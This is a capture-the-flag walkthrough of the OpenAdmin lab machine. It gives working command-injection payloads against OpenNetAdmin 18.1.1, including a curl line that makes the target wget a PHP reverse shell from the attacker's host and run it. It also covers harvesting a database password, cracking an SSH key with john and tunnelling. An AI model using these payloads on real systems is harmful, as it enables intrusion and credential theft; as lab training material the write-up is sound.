MACHINE NAME: OpenAdmin
MACHINE IP: 10.10.10.171

# Recon and Enum.

First off, as usual we'll start with an nmap scan. Let's start by scanning the top 1000 ports.

Open ports:
22/tcp open  ssh
80/tcp open  http

Port 80 seems to be a good place to begin our econ and possibly get an initial foot hold, we'll have a look and see any technology stach being used on the website.

navigating to port 80, we are greeted with a default apache2 page.

Next, let's do som directory bruteforcing using gobuster.
Interesting results from the scan, we get some paths with 301 response status codes, let's have a look what we have here.

http://10.10.10.171/artwork

I explored this page, nothing outstanding pops up.


http://10.10.10.171/sierra

Next up, I looked at this path, again, nothing interesting shows up.

http://10.10.10.171/music

Lastly, I explored this page. Here is where things got a little interesting.

Navigating to the loginpage reveals a whole new and different page.
Wecan see a notification that weare not on the latest version of opennetadmin.

What exactly is opennetadmin?

OpenNetAdmin is a system for tracking IP network attributes in a database. A web interface is provided to administer the data, and there is a fully functional CLI interface for batch management (for those of you who prefer NOT to use a GUI).

source:https:opennetadmin.com/about

Let's do some recon if we have any known vulnerabilities for version  v18.1.1.

A quick look on searchsploit db confirms that indeed we have some exploits, an RCE and a command injection exploits for this particular version.

Let's try out the latter option, exploit the RCE. First let's find out the payload to use.


curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

Upon running the curl command from the bash script, we can verify that in deed we have command execution. Let's try now and get a shell.

Since we have verified command execution on the RHOST, we can try to upload a php reverse shell script and execute to connect back to our attach machine.

Let's go to pentestmonkey's list to try a php reverse shell.

Let's host a server on our lhost to server out this script:


curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";wget 10.10.14.70:8000/shell.php;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

No let's run the earlier bash script and list directory contents on victim machine. And voila! our shell has been uploaded. Let's get our hands dirty.

Let's execute and get a connection back. We have already set up a netcat listener on our attack machine.

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";cat shell.php | php;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

Just like that, we have a shell.
Two users, jimmy and Joanna found but we need valid creds to su.

Some more manual enum on the box and we land at /opt/ona/www/local/config  where we get a database mysql config file.

passwd: n1nj4W4rri0R!

Let's Login

mysql -u ona_sys -pn1nj4W4rri0R!



curl 127.0.0.1:52846/main.php

Password reuse is common, and the dblogin creds are also Jimmy's

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 127.0.0.1:52846/main.php;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846


127.0.0.1:52846/main.php

jimmy: Revealed

Get the private key.

encrypted!

/usr/share/john/ssh2john.py joanna > joana.hash

crack hash using john to get joanna's passphrase: bloodninjas.

ssh using joanna user.

Privesc vector is through nano.